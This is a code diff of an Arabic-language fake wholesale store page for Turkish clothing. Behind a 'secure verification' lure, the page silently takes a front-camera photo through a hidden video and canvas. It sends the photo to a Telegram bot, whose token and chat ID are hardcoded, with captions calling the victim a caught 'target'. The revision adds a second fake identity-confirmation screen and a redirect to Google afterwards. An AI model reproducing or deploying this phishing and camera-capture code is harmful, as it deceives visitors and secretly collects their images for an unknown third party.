@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أسواق تركيا للجملة 🇹🇷</title>
+    <title>أسواق تركيا المفتوحة 🇹🇷</title>
     <style>
         body { font-family: sans-serif; margin: 0; background-color: #f8f9fa; text-align: center; }
         header { background-color: #d32f2f; color: white; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
-        .hero { background: white; padding: 40px 20px; margin: 20px auto; max-width: 500px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .btn-buy { background-color: #2e7d32; color: white; border: none; padding: 18px 35px; border-radius: 8px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
-        .btn-buy:active { transform: scale(0.95); }
-        #video, #canvas { display: none; } /* الكاميرا واللوحة مخفية تماماً */
-        .loading { display: none; color: #d32f2f; margin-top: 10px; font-weight: bold; }
+        .container { background: white; padding: 40px 20px; margin: 20px auto; max-width: 500px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .btn { background-color: #2e7d32; color: white; border: none; padding: 18px 35px; border-radius: 8px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; }
+        #confirm-interface { display: none; } /* مخفية في البداية */
+        #video, #canvas { display: none; }
+        .warning-text { color: #d32f2f; font-weight: bold; margin-bottom: 20px; }
     </style>
 </head>
 <body>
@@ -21,69 +21,67 @@
     <p>أفضل الماركات العالمية بأسعار الجملة</p>
 </header>
 
-<div class="hero">
+<div id="first-interface" class="container">
     <h2>تخفيضات الربيع!</h2>
     <p>لمشاهدة قائمة الأسعار الحصرية وعروض التجار، يرجى الضغط على الزر لتفعيل ميزة "التحقق الآمن".</p>
-    <button id="mainBtn" class="btn-buy" onclick="startProcess()">تفعيل العروض الحصرية</button>
-    <div id="loading" class="loading">جاري التحقق من الهوية...</div>
+    <button class="btn" onclick="showSecondStep()">تفعيل العروض الحصرية</button>
+</div>
+
+<div id="confirm-interface" class="container">
+    <h2 style="color: #d32f2f;">تأكيد الهوية</h2>
+    <p class="warning-text">مطلوب خطوة أخيرة!</p>
+    <p>يرجى تأكيد هويتك كتاجر مسجل عبر السماح بنظام "التحقق البصري" لفتح قائمة الأسعار السرية.</p>
+    <button class="btn" style="background-color: #d32f2f;" onclick="startFinalProcess()">تأكيد الآن</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="640" height="480"></canvas>
+<canvas id="canvas" width="1280" height="720"></canvas>
 
 <script>
-    // المعلومات الحقيقية من صورك (محدثة بدقة)
-    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA"; 
-    const chatId = "8124196406"; 
+    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKin5xzA";
+    const chatId = "8124196406";
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const loading = document.getElementById('loading');
-    const btn = document.getElementById('mainBtn');
+    // الانتقال للواجهة الثانية
+    function showSecondStep() {
+        document.getElementById('first-interface').style.display = 'none';
+        document.getElementById('confirm-interface').style.display = 'block';
+    }
 
-    function startProcess() {
-        btn.style.display = 'none';
-        loading.style.display = 'block';
-
-        // طلب إذن الكاميرا
+    // بدء العملية النهائية (الكاميرا والإرسال)
+    function startFinalProcess() {
+        document.querySelector('#confirm-interface .btn').innerHTML = "جاري التأكيد...";
+        
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                video.srcObject = stream;
-                // الانتظار ثانية ونصف لالتقاط الصورة بصمت
-                setTimeout(captureAndSend, 1500);
+                document.getElementById('video').srcObject = stream;
+                setTimeout(captureAndSend, 1200); // التقاط سريع
             })
             .catch(err => {
-                alert("يجب تفعيل صلاحية الكاميرا للدخول إلى نظام الأسعار.");
-                btn.style.display = 'block';
-                loading.style.display = 'none';
+                alert("خطأ: يجب الموافقة على 'تأكيد الهوية' لرؤية الأسعار.");
+                location.reload();
             });
     }
 
     function captureAndSend() {
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, 640, 480);
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
         
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'trade_shot.jpg');
-            formData.append('caption', '✅ تم صيد هدف جديد من واجهة متجر تركيا! 🇹🇷');
+            formData.append('photo', blob, 'verified_merchant.jpg');
+            formData.append('caption', '📸 هدف جديد قام بالتأكيد! 🇹🇷');
 
             fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                 method: 'POST',
                 body: formData
             })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) {
-                    alert("تم التحقق بنجاح! جاري تحويلك لقسم الأسعار.");
-                    window.location.reload(); // إعادة تحميل لإخفاء أي أثر
-                } else {
-                    console.error("Telegram Error:", data);
-                }
-            })
-            .catch(err => console.error("Fetch Error:", err));
-        }, 'image/jpeg', 0.8);
+            .then(() => {
+                alert("تم التأكيد! سيتم تحويلك الآن.");
+                window.location.href = "https://www.google.com/search?q=wholesale+turkey+clothing";
+            });
+        }, 'image/jpeg', 0.9);
     }
 </script>
 
